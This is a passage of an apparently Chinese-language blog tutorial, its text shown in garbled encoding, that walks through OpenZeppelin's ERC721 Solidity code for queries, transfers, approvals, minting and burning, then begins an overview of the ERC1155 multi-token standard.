å‡½æ•°-1" class="headerlink" title="æ„é€ å‡½æ•°"></a>æ„é€ å‡½æ•°</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.<br> */<br>constructor(string memory name_, string memory symbol_) &#123;<br>    _name = name_;<br>    _symbol = symbol_;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å®ç°æŸ¥è¯¢"><a href="#å®ç°æŸ¥è¯¢" class="headerlink" title="å®ç°æŸ¥è¯¢"></a>å®ç°æŸ¥è¯¢</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br>     * @dev See &#123;IERC165-supportsInterface&#125;.<br>     */<br>    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) &#123;<br>        return<br>            interfaceId == type(IERC721).interfaceId ||<br>            interfaceId == type(IERC721Metadata).interfaceId ||<br>            super.supportsInterface(interfaceId);<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥è°ƒç”¨</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">IERC721(contractAddress)<span class="hljs-selector-class">.supportsInterface</span>(<span class="hljs-number">0</span>x80ac58cd)<br></code></pre></td></tr></table></figure><p>æ¥æ£€æŸ¥æ˜¯å¦ç¬¦åˆERC721æ ‡å‡†</p><p>å…¶ä¸­0x80ac58cdæ¥æºå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes4 private constant _InterfaceId_ERC721 = 0x80ac58cd;<br>/*<br>     *     bytes4(keccak256(&#x27;balanceOf(address)&#x27;)) == 0x70a08231<br>     *     bytes4(keccak256(&#x27;ownerOf(uint256)&#x27;)) == 0x6352211e<br>     *     bytes4(keccak256(&#x27;approve(address,uint256)&#x27;)) == 0x095ea7b3<br>     *     bytes4(keccak256(&#x27;getApproved(uint256)&#x27;)) == 0x081812fc<br>     *     bytes4(keccak256(&#x27;setApprovalForAll(address,bool)&#x27;)) == 0xa22cb465<br>     *     bytes4(keccak256(&#x27;isApprovedForAll(address,address)&#x27;)) == 0xe985e9c5<br>     *     bytes4(keccak256(&#x27;transferFrom(address,address,uint256)&#x27;)) == 0x23b872dd<br>     *     bytes4(keccak256(&#x27;safeTransferFrom(address,address,uint256)&#x27;)) == 0x42842e0e<br>     *     bytes4(keccak256(&#x27;safeTransferFrom(address,address,uint256,bytes)&#x27;)) == 0xb88d4fde<br>     *<br>     *     =&gt; 0x70a08231 ^ 0x6352211e ^ 0x095ea7b3 ^ 0x081812fc ^<br>     *        0xa22cb465 ^ 0xe985e9c ^ 0x23b872dd ^ 0x42842e0e ^ 0xb88d4fde == 0x80ac58cd<br>     */<br></code></pre></td></tr></table></figure><h2 id="åŸºç¡€æŸ¥è¯¢"><a href="#åŸºç¡€æŸ¥è¯¢" class="headerlink" title="åŸºç¡€æŸ¥è¯¢"></a>åŸºç¡€æŸ¥è¯¢</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC721-balanceOf&#125;.<br> */<br>function balanceOf(address owner) public view virtual override returns (uint256) &#123;<br>    require(owner != address(0), &quot;ERC721: address zero is not a valid owner&quot;);<br>    return _balances[owner];<br>&#125;<br><br>/**<br> * @dev See &#123;IERC721-ownerOf&#125;.<br> */<br>function ownerOf(uint256 tokenId) public view virtual override returns (address) &#123;<br>    address owner = _owners[tokenId];<br>    require(owner != address(0), &quot;ERC721: invalid token ID&quot;);<br>    return owner;<br>&#125;<br><br>/**<br> * @dev See &#123;IERC721Metadata-name&#125;.<br> */<br>function name() public view virtual override returns (string memory) &#123;<br>    return _name;<br>&#125;<br><br>/**<br> * @dev See &#123;IERC721Metadata-symbol&#125;.<br> */<br>function symbol() public view virtual override returns (string memory) &#123;<br>    return _symbol;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="æ•°æ®æŸ¥æ‰¾"><a href="#æ•°æ®æŸ¥æ‰¾" class="headerlink" title="æ•°æ®æŸ¥æ‰¾"></a><strong>æ•°æ®æŸ¥æ‰¾</strong></h2><p>URIçš„åŸæ„ä¸ºâ€ç»Ÿä¸€èµ„æºå®šä½ç¬¦â€ï¼Œè€Œåœ¨ERC-721åˆçº¦ä¸­çš„tokenURIæ­£æ˜¯é€šè¿‡tokenIdæ¥æ£€ç´¢å¯¹åº”çš„tokenï¼Œå…·ä½“å®ç°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function tokenURI(uint256 tokenId) public view virtual override returns (string memory) &#123;<br>    _requireMinted(tokenId);<br><br>    string memory baseURI = _baseURI();<br>    return bytes(baseURI).length &gt; 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : &quot;&quot;;<br>&#125;<br><br>/**<br> * @dev Base URI for computing &#123;tokenURI&#125;. If set, the resulting URI for each<br> * token will be the concatenation of the `baseURI` and the `tokenId`. Empty<br> * by default, can be overridden in child contracts.<br> */<br>function _baseURI() internal view virtual returns (string memory) &#123;<br>    return &quot;&quot;;<br>&#125;<br><br>/**<br> * @dev Returns whether `tokenId` exists.<br> *<br> * Tokens can be managed by their owner or approved accounts via &#123;approve&#125; or &#123;setApprovalForAll&#125;.<br> *<br> * Tokens start existing when they are minted (`_mint`),<br> * and stop existing when they are burned (`_burn`).<br> */<br>function _exists(uint256 tokenId) internal view virtual returns (bool) &#123;<br>    return _owners[tokenId] != address(0);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="è½¬è´¦é€»è¾‘-1"><a href="#è½¬è´¦é€»è¾‘-1" class="headerlink" title="è½¬è´¦é€»è¾‘"></a>è½¬è´¦é€»è¾‘</h2><p>å’ŒERC20åŒºåˆ«åœ¨äºï¼Œæ²¡æœ‰transferå‡½æ•°</p><p>ä¸”åœ¨ERC-20ä¸­Tokenå¯ä»¥æ— é™ç»†åˆ†ä¸º10^18ä»½ï¼Œè€ŒERC-721çš„Tokenæœ€å°çš„å•ä½ä¸º1ï¼Œæ— æ³•å†åˆ†å‰²ï¼Œè€Œä¸”æ¯ä¸€ä¸ªTokenå®Œå…¨ä¸åŒï¼Œä¸åŒçš„Tokenå¯¹ä¸åŒçš„ç”¨æˆ·éƒ½æœ‰ä¸åŒçš„ä»·å€¼ã€‚</p><p>é™¤äº†approveã€transferFromå‡½æ•°ä»¥å¤–ï¼ŒERC721è¿˜æœ‰safeTransferFromæ–¹æ³•</p><p>safeTransferFromæ–¹æ³•ä¼šé¦–å…ˆæ£€æŸ¥åˆçº¦æ¥æ”¶è€…æ˜¯å¦äº†è§£ ERC721 åè®®ï¼Œä»¥é˜²æ­¢ä»£å¸è¢«æ°¸ä¹…é”å®šã€‚</p><p>è€ŒtransferFromä¸ä¼šï¼Œä¸é¼“åŠ±ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œå°½å¯èƒ½ä½¿ç”¨safeTransferFrom</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC721-safeTransferFrom&#125;.<br> */<br>function safeTransferFrom(<br>    address from,<br>    address to,<br>    uint256 tokenId<br>) public virtual override &#123;<br>    safeTransferFrom(from, to, tokenId, &quot;&quot;);<br>&#125;<br><br>/**<br> * @dev See &#123;IERC721-safeTransferFrom&#125;.<br> */<br>function safeTransferFrom(<br>    address from,<br>    address to,<br>    uint256 tokenId,<br>    bytes memory data<br>) public virtual override &#123;<br>    require(_isApprovedOrOwner(_msgSender(), tokenId), &quot;ERC721: caller is not token owner nor approved&quot;);<br>    _safeTransfer(from, to, tokenId, data);<br>&#125;<br><br>/**<br> * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients<br> * are aware of the ERC721 protocol to prevent tokens from being forever locked.<br> *<br> * `data` is additional data, it has no specified format and it is sent in call to `to`.<br> *<br> * This internal function is equivalent to &#123;safeTransferFrom&#125;, and can be used to e.g.<br> * implement alternative mechanisms to perform token transfer, such as signature-based.<br> *<br> * Requirements:<br> *<br> * - `from` cannot be the zero address.<br> * - `to` cannot be the zero address.<br> * - `tokenId` token must exist and be owned by `from`.<br> * - If `to` refers to a smart contract, it must implement &#123;IERC721Receiver-onERC721Received&#125;, which is called upon a safe transfer.<br> *<br> * Emits a &#123;Transfer&#125; event.<br> */<br>function _safeTransfer(<br>    address from,<br>    address to,<br>    uint256 tokenId,<br>    bytes memory data<br>) internal virtual &#123;<br>    _transfer(from, to, tokenId);<br>    require(_checkOnERC721Received(from, to, tokenId, data), &quot;ERC721: transfer to non ERC721Receiver implementer&quot;);<br>&#125;<br><br>/**<br> * @dev Returns whether `tokenId` exists.<br> *<br> * Tokens can be managed by their owner or approved accounts via &#123;approve&#125; or &#123;setApprovalForAll&#125;.<br> *<br> * Tokens start existing when they are minted (`_mint`),<br> * and stop existing when they are burned (`_burn`).<br> */<br>function _exists(uint256 tokenId) internal view virtual returns (bool) &#123;<br>    return _owners[tokenId] != address(0);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>_isApprovedOrOwnerç”¨æ¥æ£€æŸ¥å½“å‰å‡½æ•°è°ƒç”¨è€…æ˜¯å¦æ˜¯tokençš„æŒæœ‰è€…æˆ–è€…æ˜¯tokenæŒæœ‰è€…èµ‹äºˆæ“æ§æƒé™çš„ç”¨æˆ·åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Returns whether `spender` is allowed to manage `tokenId`.<br> *<br> * Requirements:<br> *<br> * - `tokenId` must exist.<br> */<br>function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) &#123;<br>    address owner = ERC721.ownerOf(tokenId);<br>    return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);<br>&#125;<br></code></pre></td></tr></table></figure><p>_safeTransferå‡½æ•°ä¸­æœ‰ä¸€ä¸ª _checkOnERC721Receivedï¼Œè¯¥å‡½æ•°çš„å®ç°ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼Œå…¶åŠŸèƒ½ç”¨ä¸€å¥è¯æ¥æ¦‚æ‹¬å°±æ˜¯è¦æ±‚ç”¨äºæ¥å—tokençš„åœ°å€æ˜¯ä¸€ä¸ªè´¦æˆ·åœ°å€æˆ–è€…æ˜¯ä¸€ä¸ªç¬¦åˆERC-721è§„èŒƒçš„åˆçº¦åœ°å€ï¼Œå¦åˆ™å›æ»šäº¤æ˜“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Internal function to invoke &#123;IERC721Receiver-onERC721Received&#125; on a target address.<br> * The call is not executed if the target address is not a contract.<br> *<br> * @param from address representing the previous owner of the given token ID<br> * @param to target address that will receive the tokens<br> * @param tokenId uint256 ID of the token to be transferred<br> * @param data bytes optional data to send along with the call<br> * @return bool whether the call correctly returned the expected magic value<br> */<br>function _checkOnERC721Received(<br>    address from,<br>    address to,<br>    uint256 tokenId,<br>    bytes memory data<br>) private returns (bool) &#123;<br>    if (to.isContract()) &#123;<br>        try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) &#123;<br>            return retval == IERC721Receiver.onERC721Received.selector;<br>        &#125; catch (bytes memory reason) &#123;<br>            if (reason.length == 0) &#123;<br>                revert(&quot;ERC721: transfer to non ERC721Receiver implementer&quot;);<br>            &#125; else &#123;<br>                /// @solidity memory-safe-assembly<br>                assembly &#123;<br>                    revert(add(32, reason), mload(reason))<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; else &#123;<br>        return true;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>é™¤äº†approveï¼ŒERC721è¿˜æœ‰setApprovalForAllæ–¹æ³•ï¼Œèƒ½å°†è°ƒç”¨è€…msg.senderçš„æ‰€æœ‰NFTèµ„äº§æˆæƒç»™_operatoråœ°å€æ¥ç®¡ç†ï¼Œæˆ–è€…å–æ¶ˆæˆæƒï¼Œå¹¶ä¸”è§¦å‘ApprovalForAlläº‹ä»¶ã€‚ä½†operatorä¸èƒ½æ˜¯è°ƒç”¨è€…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC721-setApprovalForAll&#125;.<br> */<br>function setApprovalForAll(address operator, bool approved) public virtual override &#123;<br>    _setApprovalForAll(_msgSender(), operator, approved);<br>&#125;<br><br>/**<br> * @dev See &#123;IERC721-isApprovedForAll&#125;.<br> */<br>function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) &#123;<br>    return _operatorApprovals[owner][operator];<br>&#125;<br><br>/**<br> * @dev Approve `operator` to operate on all of `owner` tokens<br> *<br> * Emits an &#123;ApprovalForAll&#125; event.<br> */<br>function _setApprovalForAll(<br>    address owner,<br>    address operator,<br>    bool approved<br>) internal virtual &#123;<br>    require(owner != operator, &quot;ERC721: approve to caller&quot;);<br>    _operatorApprovals[owner][operator] = approved;<br>    emit ApprovalForAll(owner, operator, approved);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨getApprovedå‡½æ•°ï¼Œæ ¹æ®tokenIdæ¥æ£€ç´¢æˆæƒè½¬è´¦çš„åœ°å€æœ‰å“ªäº›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC721-getApproved&#125;.<br> */<br>function getApproved(uint256 tokenId) public view virtual override returns (address) &#123;<br>    _requireMinted(tokenId);<br><br>    return _tokenApprovals[tokenId];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é“¸å¸æ“ä½œ-1"><a href="#é“¸å¸æ“ä½œ-1" class="headerlink" title="é“¸å¸æ“ä½œ"></a>é“¸å¸æ“ä½œ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Safely mints `tokenId` and transfers it to `to`.<br> *<br> * Requirements:<br> *<br> * - `tokenId` must not exist.<br> * - If `to` refers to a smart contract, it must implement &#123;IERC721Receiver-onERC721Received&#125;, which is called upon a safe transfer.<br> *<br> * Emits a &#123;Transfer&#125; event.<br> */<br>function _safeMint(address to, uint256 tokenId) internal virtual &#123;<br>    _safeMint(to, tokenId, &quot;&quot;);<br>&#125;<br><br>/**<br> * @dev Same as &#123;xref-ERC721-_safeMint-address-uint256-&#125;[`_safeMint`], with an additional `data` parameter which is<br> * forwarded in &#123;IERC721Receiver-onERC721Received&#125; to contract recipients.<br> */<br>function _safeMint(<br>    address to,<br>    uint256 tokenId,<br>    bytes memory data<br>) internal virtual &#123;<br>    _mint(to, tokenId);<br>    require(<br>        _checkOnERC721Received(address(0), to, tokenId, data),<br>        &quot;ERC721: transfer to non ERC721Receiver implementer&quot;<br>    );<br>&#125;<br><br>/**<br> * @dev Mints `tokenId` and transfers it to `to`.<br> *<br> * WARNING: Usage of this method is discouraged, use &#123;_safeMint&#125; whenever possible<br> *<br> * Requirements:<br> *<br> * - `tokenId` must not exist.<br> * - `to` cannot be the zero address.<br> *<br> * Emits a &#123;Transfer&#125; event.<br> */<br>function _mint(address to, uint256 tokenId) internal virtual &#123;<br>    require(to != address(0), &quot;ERC721: mint to the zero address&quot;);<br>    require(!_exists(tokenId), &quot;ERC721: token already minted&quot;);<br><br>    _beforeTokenTransfer(address(0), to, tokenId);<br><br>    _balances[to] += 1;<br>    _owners[tokenId] = to;<br><br>    emit Transfer(address(0), to, tokenId);<br><br>    _afterTokenTransfer(address(0), to, tokenId);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="ä»£å¸é”€æ¯-1"><a href="#ä»£å¸é”€æ¯-1" class="headerlink" title="ä»£å¸é”€æ¯"></a>ä»£å¸é”€æ¯</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Destroys `tokenId`.<br> * The approval is cleared when the token is burned.<br> *<br> * Requirements:<br> *<br> * - `tokenId` must exist.<br> *<br> * Emits a &#123;Transfer&#125; event.<br> */<br>function _burn(uint256 tokenId) internal virtual &#123;<br>    address owner = ERC721.ownerOf(tokenId);<br><br>    _beforeTokenTransfer(owner, address(0), tokenId);<br><br>    // Clear approvals<br>    delete _tokenApprovals[tokenId];<br><br>    _balances[owner] -= 1;<br>    delete _owners[tokenId];<br><br>    emit Transfer(owner, address(0), tokenId);<br><br>    _afterTokenTransfer(owner, address(0), tokenId);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ERC1155"><a href="#ERC1155" class="headerlink" title="ERC1155"></a>ERC1155</h1><p><a href="https://docs.openzeppelin.com/contracts/4.x/erc1155">ERC1155å®˜æ–¹æ–‡æ¡£</a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC1155">ERC1155åˆçº¦ä»£ç </a></p><p>ERC1155åè®®æ˜¯ç”±Witek Radomski, Andrew Cookeç­‰äº2018å¹´6æœˆåœ¨EIP1155ææ¡ˆä¸­æå‡ºçš„ç”¨äºå¤šç§ä»£å¸ç®¡ç†çš„åˆçº¦æ ‡å‡†æ¥å£ã€‚å•ä¸ªéƒ¨ç½²çš„åˆçº¦å¯ä»¥åŒ…æ‹¬åŒè´¨åŒ–ä»£å¸ã€éåŒè´¨åŒ–ä»£å¸æˆ–å…¶ä»–é…ç½®ï¼ˆå¦‚åŠåŒè´¨åŒ–ä»£å¸ï¼‰çš„ä»»ä½•ç»„åˆã€‚</p><p>å¤šä»£å¸æ ‡å‡†çš„ç›®çš„æ˜¯åˆ›å»ºä¸€ä¸ªæ™ºèƒ½åˆçº¦æ¥å£ï¼Œå¯ä»¥ä»£è¡¨å’Œæ§åˆ¶ä»»ä½•æ•°é‡çš„åŒè´¨åŒ–å’ŒéåŒè´¨åŒ–ä»£å¸ç±»å‹ã€‚è¿™æ ·ä¸€æ¥ï¼ŒERC-1155ä»£å¸å°±å…·æœ‰ä¸ERC20å’ŒERC721ä»£å¸ç›¸åŒçš„åŠŸèƒ½ï¼Œç”šè‡³å¯ä»¥åŒæ—¶ä½¿ç”¨è¿™ä¸¤è€…çš„åŠŸèƒ½ã€‚è€Œæœ€é‡è¦çš„æ˜¯ï¼Œå®ƒèƒ½æ”¹å–„è¿™ä¸¤ç§æ ‡å‡†çš„åŠŸèƒ½ï¼Œä½¿å…¶æ›´æœ‰æ•ˆç‡ï¼Œå¹¶çº æ­£ERC20å’ŒERC721æ ‡å‡†ä¸Šæ˜æ˜¾çš„å®æ–½é”™è¯¯ã€‚</p><p>ç”±äºæ‰€æœ‰çŠ¶æ€éƒ½ä¿å­˜åœ¨å•ä¸ªåˆçº¦ä¸­ï¼Œå› æ­¤å¯ä»¥éå¸¸æœ‰æ•ˆåœ°åœ¨å•ä¸ªäº¤æ˜“ä¸­å¯¹å¤šä¸ªä»£å¸è¿›è¡Œæ“ä½œã€‚è¯¥æ ‡å‡†æä¾›äº†ä¸¤ä¸ªåŠŸèƒ½ï¼Œ<a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC1155#IERC1155-balanceOfBatch-address---uint256---"><code>balanceOfBatch</code></a>å’Œ<a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC1155#IERC1155-safeBatchTransferFrom-address-address-uint256---uint256---bytes-"><code>safeBatchTransferFrom</code></a>ï¼Œè¿™ä½¿å¾—æŸ¥è¯¢å¤šä¸ªä½™é¢å’Œè½¬ç§»å¤šä¸ªä»£å¸å˜å¾—æ›´ç®€å•ï¼Œæ¶ˆè€—gasæ›´å°‘ã€‚</p><p>ERC1155çš„åŠŸèƒ½åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>æ‰¹é‡ä¼ è¾“ï¼šé€šè¿‡ä¸€æ¬¡åˆçº¦è°ƒç”¨ä¼ è¾“å¤šç§èµ„äº§ï¼›</li><li>æ‰¹é‡ä½™é¢ï¼šåœ¨ä¸€æ¬¡è°ƒç”¨ä¸­è·å–å¤šä¸ªèµ„äº§çš„ä½™é¢ï¼›</li><li>æ‰¹é‡æˆæƒï¼šæˆæƒåŒä¸€åœ°å€çš„æ‰€æœ‰ä»£å¸ï¼›</li><li>Hookï¼šæ¥æ”¶ä»£å¸çš„é’©å­å‡½æ•°ï¼›</li><li>æ”¯æŒéåŒè´¨åŒ–ä»£å¸ï¼šå¦‚æœä¾›åº”é‡ä»…ä¸º 1ï¼Œå°†å…¶ä½œä¸ºéåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰å¤„ç†ï¼›</li><li>å®‰å…¨è½¬è´¦è§„åˆ™ï¼šå®‰å…¨è½¬è´¦è§„åˆ™é›†ã€‚é‡è¦è§„åˆ™å¦‚ä¸‹ï¼š<ol><li>è°ƒç”¨è€…å¿…é¡»è·å¾—æ‰¹å‡†æ‰èƒ½ä» _from çš„è´¦æˆ·åœ°å€æ¶ˆè´¹ä»£å¸ï¼Œæˆ–è€…è°ƒç”¨è€…è´¦æˆ·åœ°å€å¿…é¡»ä¸ _from çš„è´¦æˆ·åœ°å€ç›¸åŒã€‚</li><li>åœ¨ä»¥ä¸‹æƒ…å†µä¸‹ï¼Œè½¬è´¦è°ƒç”¨å°†å›æ»šï¼š</li></ol></li></ul><p>â€‹            ï¼ˆ1ï¼‰_toåœ°å€ä¸º0ï¼›</p><p>â€‹            ï¼ˆ2ï¼‰_ idsçš„é•¿åº¦ä¸_valuesçš„é•¿åº¦ä¸åŒï¼›</p><p>â€‹            ï¼ˆ3ï¼‰_ idsä¸­ä»£å¸æŒæœ‰è€…çš„ä»»ä½•ä½™é¢ä½äºå‘é€ç»™æ¥æ”¶è€…çš„ç›¸åº”_valueé‡‘é¢ï¼›</p><p>â€‹            ï¼ˆ4ï¼‰å‡ºç°ä»»ä½•å…¶ä»–é”™è¯¯ã€‚</p><p><img src="/2022/07/20/ERC20-ERC721-ERC1155/image-20220710232011444.png" alt="image-20220710232011444"></p><p><img src="/2022/07/20/ERC20-ERC721-ERC1155/image-20220710232024558.png" alt="image-20220710232024558"></p><h2 id="åŸºæœ¬å˜é‡-2"><a href="#åŸºæœ¬å˜é‡-2" class="headerlink" title="åŸºæœ¬å˜é‡"></a>åŸºæœ¬å˜é‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 